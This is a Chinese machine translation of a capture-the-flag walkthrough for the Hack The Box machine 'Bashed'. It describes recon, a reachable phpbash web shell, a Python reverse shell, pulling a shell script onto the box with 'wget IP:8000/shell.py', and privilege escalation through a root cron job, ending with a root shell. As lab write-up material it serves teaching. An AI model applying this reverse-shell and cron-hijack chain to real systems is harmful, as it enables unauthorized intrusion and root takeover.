<html>
<head>
<title>Bashed Walk through</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Bashed走过</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bashed-walk-through-36374a640bcc?source=collection_archive---------0-----------------------#2018-04-28">https://infosecwriteups.com/bashed-walk-through-36374a640bcc?source=collection_archive---------0-----------------------#2018-04-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/49163ebae99309adef1cc96adfc992d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*cb6QPP4eyrDeLZflJrhCtQ.jpeg"/></div></figure><p id="8b1b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">Bashed是Hackthebox 上的一个CTF盒子，它很快就要退役了，所以我想我应该写一个穿越。</p><p id="1bb4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以像往常一样，我通过nmap扫描开始了对盒子的侦察，并发现了以下结果。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/c0642defb144fc8584d6c6af0d21c64c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VjjTtzlR9_X49J-FNCJUqg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">Nmap扫描结果</figcaption></figure><p id="4a74" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">端口80打开，打开我的浏览器，输入IP，我看到一个网页，我注意到的第一件事是这个..</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lg"><img src="../Images/f9186af181c5b8b980904a07be79ac45.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jXntdbe8pPrkLLstk0wmUw.jpeg"/></div></div></figure><p id="d534" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以在服务器上有一个名为phpbash的文件，所以是时候暴力破解一些目录了，所以我用默认选项启动DIRB并找到了一些目录。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/186c318e938096cb25248ecd6a6919ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4BqV0puzLW85m5eI4hculQ.png"/></div></div></figure><p id="3e4c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在dev目录中，我找到了phpbash文件，它是即时RCE。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/706f9d407af623a555a5cebdc21cb310.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nSFZ4GCAnloakKiiWsGnEg.png"/></div></div></figure><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/6f9bef3de79fe14aaf71c6586e862a8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I9aZbnjps6Q4brEi22IhwA.png"/></div></div></figure><p id="9f7b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以我得到了外壳和用户标志，但我对这个外壳不满意，所以它被放到了“<strong class="jw ir"> tmp </strong>目录，我上传了我的<a class="ae ks" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> python反向外壳</strong> </a>到那里，并连接到我的机器上。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/453314c0ffe13b523c5ef01356ae204c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Xt8cq1DIhJWfeoCeuOwMyA.png"/></div></div></figure><p id="5ff7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以下一步是检查<strong class="jw ir"> PRIV ESC </strong>，所以我使用<a class="ae ks" href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" rel="noopener ugc nofollow" target="_blank"> LinEnum.sh </a>来检查<strong class="jw ir">权限提升</strong>，发现了一些有趣的东西。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/0a4b2cf94f23d82ee95f0957926c051f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HemMe5EjAfO_747xhJognw.png"/></div></div></figure><p id="611b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以在不提供密码的情况下从www-data更改为用户scriptmanager(也可以通过键入sudo -l来检查这些)</p><p id="0df4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以我切换到scriptmanager，通常命令是“<em class="lh"> sudo -u username </em>”，但由于某种原因，我不能这样做，所以我想出了另一个主意</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/58e7ac94839df025f83145266cf87f0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*L_mmVKy0jlUc5UynzsT0Lw.gif"/></div></figure><p id="fb31" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们还可以在切换到另一个用户时执行命令，例如在执行脚本管理器的whoami时，将类似于"<em class="lh">sudo-u script manager whoami "</em>将返回输出作为<strong class="jw ir"> scriptmanager </strong>因此，我更改了我的python shell的端口，启动了一个python HttpServer，并使用wget，同时切换到脚本管理器" sudo-u script manager "<strong class="jw ir">wget IP:8000/shell . py</strong></p><p id="a8c5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">然后我启动了一个netcat监听器并执行了python shell，这次我需要指定python的完整路径，并且我是scriptmanager。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/45f42c469599822a2e4556ec8d3b8c1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ltxmtTTFHYcN39NcAITDPA.png"/></div></div></figure><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/fd7fdc957cbe4728092ffa117517e9ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9nzGM7VGBP9mMqh5NWnywA.png"/></div></div></figure><p id="1b23" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我执行“<strong class="jw ir"> ls -la </strong>”时，我注意到一个名为scripts的目录。我看到scripts文件夹属于scriptmanager，并且我发现script目录中的任何内容都由root每2或3分钟执行一次。(在LinEnum.sh输出中找到)</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/bc83edb587f011785b7d7b7766a0a0cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8_Pg7h-gdG20qzndlm4aCg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">盒子里还有一个人</figcaption></figure><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/469e5723cbaff40735df3394fb60d8be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*fMHKnNVUirVo5AbspjDOXA.gif"/></div></figure><p id="19f3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">shell脚本再次将端口号wget更改为box并启动netcat监听器，现在这是一个等待的游戏，当cronjob执行时，我将获得一个shell作为root</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kt"><img src="../Images/b8c5a8a14db11cf7ac6d504c1204c6d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5tp1Slts9aGxuiX46oDRUg.png"/></div></div></figure><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/65f36ef172a09b582a0009508a3895e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*k0WrUu38-Pvsn4lkSJTWeA.gif"/></div></figure><p id="4297" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">玩HTB极大地帮助了我获得新的技能，结交来自其他国家的好朋友，玩得开心。</p><p id="db0f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">对于新来的人，我强烈推荐你观看<a class="ae ks" href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" rel="noopener ugc nofollow" target="_blank"> Ippsec </a>的视频</p><p id="64e4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">玩得开心…</p><p id="c4f6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是<a class="ae ks" href="https://www.hackthebox.eu/home/users/profile/5938" rel="noopener ugc nofollow" target="_blank">我</a></p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi li"><img src="../Images/bd28899c170e96909f6670f4de167edb.png" data-original-src="https://miro.medium.com/v2/resize:fit:440/format:webp/1*c04RRygw6YDH7aN01cGxcA.png"/></div></figure></div></div>    
</body>
</html>